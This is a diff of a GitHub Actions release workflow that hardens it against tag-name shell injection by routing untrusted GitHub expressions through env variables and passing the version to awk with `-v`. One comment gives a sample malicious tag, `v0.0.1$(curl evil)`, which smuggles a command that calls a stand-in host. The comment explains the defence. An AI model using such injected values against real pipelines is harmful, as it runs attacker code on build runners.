@@ -38,6 +38,16 @@ jobs:
   build:
     needs: test
     runs-on: ubuntu-latest
+    # SAFETY CONTRACT (do not strip without re-checking every `run:` script):
+    # All `${{ github.* }}` user-controlled inputs are routed through env vars
+    # at the job level so they never participate in shell tokenization.
+    # A tag named e.g. `v0.0.1$(curl evil)` would otherwise execute on the
+    # runner the moment any step's `run:` block contains the bare expression.
+    # Job-level scope makes the safe path the default for any future step
+    # that needs the tag — a step author cannot forget the per-step env block.
+    env:
+      TAG: ${{ github.ref_name }}
+      REPO: ${{ github.repository }}
     strategy:
       fail-fast: true
       matrix:
@@ -63,8 +73,7 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: "0"
         run: |
-          VERSION="${{ github.ref_name }}"
-          LDFLAGS="-s -w -X main.version=${VERSION}"
+          LDFLAGS="-s -w -X main.version=${TAG}"
           OUT="_out/omni-infra-provider-truenas-${GOOS}-${GOARCH}"
           mkdir -p _out
           go build -ldflags="$LDFLAGS" -o "$OUT" ./cmd/omni-infra-provider-truenas
@@ -84,6 +93,16 @@ jobs:
       contents: write
       packages: write
       id-token: write  # Required for cosign keyless signing via Sigstore OIDC
+    # SAFETY CONTRACT (do not strip without re-checking every `run:` script):
+    # All `${{ github.* }}` user-controlled inputs are routed through env vars
+    # at the job level so they never participate in shell tokenization.
+    # `steps.version.outputs.tag` is also set FROM `github.ref_name`, so it is
+    # equivalent to `$TAG` and gets the same treatment. The signed-tag verify
+    # gate runs INSIDE this job — its inputs depend on the same protection,
+    # so this env block must remain valid for every step including the gate.
+    env:
+      TAG: ${{ github.ref_name }}
+      REPO: ${{ github.repository }}
     steps:
       - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
         with:
@@ -99,8 +118,13 @@ jobs:
       # annotated tag object is replaced with a direct ref to the commit.
       # See actions/checkout#1467. Re-fetch the annotated tag object
       # explicitly so `git tag --verify` can read its signature.
+      # CRITICAL: this fetch runs BEFORE the signed-tag verify gate below,
+      # so any shell injection here fires before signatures are checked.
+      # $TAG is set at the job level (see SAFETY CONTRACT in the `release:`
+      # env block) — the bare github.ref_name expression must NOT be
+      # reintroduced into this run script.
       - name: Refetch annotated tag object
-        run: git fetch origin "refs/tags/${{ github.ref_name }}:refs/tags/${{ github.ref_name }}" --force
+        run: git fetch origin "refs/tags/${TAG}:refs/tags/${TAG}" --force
 
       # SSH-signed tags require an allowed-signers file so git can map a
       # signature back to a trusted identity. The file is committed to the
@@ -114,10 +138,12 @@ jobs:
       # access to a tag namespace can publish a "v*" release through this
       # workflow. Enable required_signatures on the repo ruleset AND the
       # workflow check — belt and braces. (supply-chain M14)
+      # The verify gate is the final guard against poisoned-tag releases —
+      # its $TAG comes from the job-level env (see SAFETY CONTRACT) so the
+      # untrusted github.ref_name is never inlined into this script.
       - name: Verify tag is signed
         run: |
           set -euo pipefail
-          TAG="${{ github.ref_name }}"
           if ! git tag --verify "${TAG}" 2>&1; then
             echo "::error::Tag ${TAG} is not signed or the signature did not verify. Re-tag with 'git tag -s ${TAG}' from a trusted signing key."
             exit 1
@@ -130,14 +156,14 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          if gh release view "${{ github.ref_name }}" &>/dev/null; then
-            echo "::error::Release ${{ github.ref_name }} already exists. Immutable releases cannot be updated. To re-release: gh release delete ${{ github.ref_name }} --yes && git push origin :refs/tags/${{ github.ref_name }}"
+          if gh release view "${TAG}" &>/dev/null; then
+            echo "::error::Release ${TAG} already exists. Immutable releases cannot be updated. To re-release: gh release delete ${TAG} --yes && git push origin :refs/tags/${TAG}"
             exit 1
           fi
 
       - name: Set version from tag
         id: version
-        run: echo "tag=${{ github.ref_name }}" >> "$GITHUB_OUTPUT"
+        run: echo "tag=${TAG}" >> "$GITHUB_OUTPUT"
 
       # Pre-release detection. Semver pre-release tags (vX.Y.Z-rc.N,
       # vX.Y.Z-beta.N, vX.Y.Z-alpha.N) carry a `-` after the version core.
@@ -152,7 +178,6 @@ jobs:
       - name: Detect prerelease
         id: prerelease
         run: |
-          TAG="${{ github.ref_name }}"
           if [[ "$TAG" == *-* ]]; then
             echo "is_prerelease=true" >> "$GITHUB_OUTPUT"
             echo "Tag ${TAG} is a pre-release (will not be marked latest)."
@@ -181,8 +206,8 @@ jobs:
         id: is_newest
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          CURRENT: ${{ env.TAG }}
         run: |
-          CURRENT="${{ github.ref_name }}"
           # Get all existing release tags from GitHub. The CURRENT tag's
           # release hasn't been created yet at this workflow stage, so
           # we add it to the comparison set explicitly. `sort -rV`
@@ -203,15 +228,26 @@ jobs:
             echo "Tag ${CURRENT} is NOT the newest (${NEWEST} is newer). :preview will NOT be updated to avoid moving it backward."
           fi
 
+      # $TAG and $REPO come from the job-level env block. steps.version.outputs.tag
+      # was previously plumbed in here too — that field is set FROM github.ref_name,
+      # so it carries the same risk as the bare expression. Job-level env is the
+      # one source.
       - name: Extract release notes from CHANGELOG.md
         run: |
-          TAG="${{ steps.version.outputs.tag }}"
           PREV_TAG=$(git describe --tags --abbrev=0 "$TAG^" 2>/dev/null || echo "")
 
           # Extract the section for this version from CHANGELOG.md.
           # Matches from "## [vX.Y.Z]" to the next "## [" or end of file.
           VERSION="${TAG#v}"  # strip leading v for flexible matching
-          NOTES=$(awk "/^## \\[v?${VERSION}\\]/{found=1; next} /^## \\[/{if(found) exit} found{print}" CHANGELOG.md)
+          # Pass VERSION to awk via -v so awk regex metacharacters in the tag
+          # cannot widen or break the section match. Direct embedding turned
+          # the tag into part of the regex source; -v keeps it as a string
+          # variable that the program references explicitly.
+          NOTES=$(awk -v ver="$VERSION" '
+            $0 ~ "^## \\[v?" ver "\\]" { found=1; next }
+            /^## \[/ { if (found) exit }
+            found { print }
+          ' CHANGELOG.md)
 
           if [ -z "$NOTES" ]; then
             echo "::warning::No CHANGELOG.md entry found for ${TAG}. Falling back to git log."
@@ -222,7 +258,7 @@ jobs:
           {
             echo "$NOTES"
             echo ""
-            echo "**Full Changelog**: https://github.com/${{ github.repository }}/compare/${PREV_TAG:-$(git rev-list --max-parents=0 HEAD | head -1)}...${TAG}"
+            echo "**Full Changelog**: https://github.com/${REPO}/compare/${PREV_TAG:-$(git rev-list --max-parents=0 HEAD | head -1)}...${TAG}"
           } > RELEASE_NOTES.md
 
           echo "--- Release notes ---"
@@ -330,7 +366,7 @@ jobs:
       - name: Smoke test local image (binary is executable)
         run: |
           set -euo pipefail
-          IMAGE="smoke-test:${{ steps.version.outputs.tag }}"
+          IMAGE="smoke-test:${TAG}"
           echo "Running --version inside ${IMAGE}..."
           OUTPUT=$(docker run --rm "${IMAGE}" --version 2>&1)
           echo "stdout: ${OUTPUT}"
@@ -338,9 +374,8 @@ jobs:
             echo "::error::Smoke test failed: --version produced no output. Binary is likely missing the execute bit or crashed on startup."
             exit 1
           fi
-          EXPECTED="${{ steps.version.outputs.tag }}"
-          if [ "${OUTPUT}" != "${EXPECTED}" ]; then
-            echo "::error::Smoke test failed: expected version ${EXPECTED}, got ${OUTPUT}. The ldflags -X main.version=... did not take effect during build."
+          if [ "${OUTPUT}" != "${TAG}" ]; then
+            echo "::error::Smoke test failed: expected version ${TAG}, got ${OUTPUT}. The ldflags -X main.version=... did not take effect during build."
             exit 1
           fi
           echo "Smoke test passed: image runs and reports version ${OUTPUT}"
@@ -361,7 +396,7 @@ jobs:
       - name: Verify image and Dockerfile invariants
         run: |
           set -euo pipefail
-          IMAGE="smoke-test:${{ steps.version.outputs.tag }}"
+          IMAGE="smoke-test:${TAG}"
 
           USER_GID=$(docker inspect "${IMAGE}" --format '{{.Config.User}}')
           if [ "${USER_GID}" != "65534:65534" ]; then
@@ -405,11 +440,12 @@ jobs:
       # catch regressions where a cross-compiled arm64 layer breaks at
       # runtime. (supply-chain M15)
       - name: Multi-arch pulled-image smoke test
+        env:
+          DIGEST: ${{ steps.docker-push.outputs.digest }}
+          EXPECTED: ${{ env.TAG }}
+          META_VERSION: ${{ steps.meta.outputs.version }}
         run: |
           set -euo pipefail
-          DIGEST="${{ steps.docker-push.outputs.digest }}"
-          IMAGE="ghcr.io/${{ github.repository }}@${DIGEST}"
-          EXPECTED="${{ steps.version.outputs.tag }}"
 
           # Use the tag (not the multi-arch index digest) to reference the
           # image across platforms — pulling the same digest under two
@@ -427,7 +463,7 @@ jobs:
           # produced `manifest unknown` on the v0.16.1-rc.1 attempt because
           # the pulled tag never existed. The parsed version is always
           # what's pushed, so it always exists.
-          TAGGED="ghcr.io/${{ github.repository }}:${{ steps.meta.outputs.version }}"
+          TAGGED="ghcr.io/${REPO}:${META_VERSION}"
           for platform in linux/amd64 linux/arm64; do
             echo "--- smoke test ${platform}"
             # Pre-pull silently so 'docker run' stderr (cache-miss progress)
@@ -445,6 +481,8 @@ jobs:
         uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1
 
       - name: Sign Docker image
+        env:
+          DIGEST: ${{ steps.docker-push.outputs.digest }}
         run: |
           # `--oidc-issuer` is intentionally NOT passed. cosign 2.5+ rejects
           # the combination of an explicit service URL with the new
@@ -456,8 +494,7 @@ jobs:
           # redundant for keyless signing in GHA. Pre-cosign-2.5 builds
           # accepted both; v0.16.1-rc.2 was the first run after the upgrade
           # and surfaced the regression.
-          cosign sign --yes \
-            ghcr.io/${{ github.repository }}@${{ steps.docker-push.outputs.digest }}
+          cosign sign --yes "ghcr.io/${REPO}@${DIGEST}"
 
       - name: Generate SBOM
         # anchore/sbom-action's @v0 channel is deliberately unstable per their
@@ -470,12 +507,14 @@ jobs:
           output-file: _out/sbom.spdx.json
 
       - name: Attest SBOM to image
+        env:
+          DIGEST: ${{ steps.docker-push.outputs.digest }}
         run: |
           # See "Sign Docker image" above for why --oidc-issuer is omitted.
           cosign attest --yes \
             --predicate _out/sbom.spdx.json \
             --type spdxjson \
-            ghcr.io/${{ github.repository }}@${{ steps.docker-push.outputs.digest }}
+            "ghcr.io/${REPO}@${DIGEST}"
 
       - name: Sign release binaries
         run: |
@@ -523,14 +562,15 @@ jobs:
       - name: Create GitHub Release with all assets
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          IS_PRERELEASE: ${{ steps.prerelease.outputs.is_prerelease }}
         run: |
           ARGS=()
-          if [ "${{ steps.prerelease.outputs.is_prerelease }}" = "true" ]; then
+          if [ "${IS_PRERELEASE}" = "true" ]; then
             ARGS+=("--prerelease")
           fi
-          gh release create "${{ steps.version.outputs.tag }}" \
+          gh release create "${TAG}" \
             "${ARGS[@]}" \
-            --title "${{ steps.version.outputs.tag }}" \
+            --title "${TAG}" \
             --notes-file RELEASE_NOTES.md \
             _out/omni-infra-provider-truenas-linux-amd64 \
             _out/omni-infra-provider-truenas-linux-arm64 \
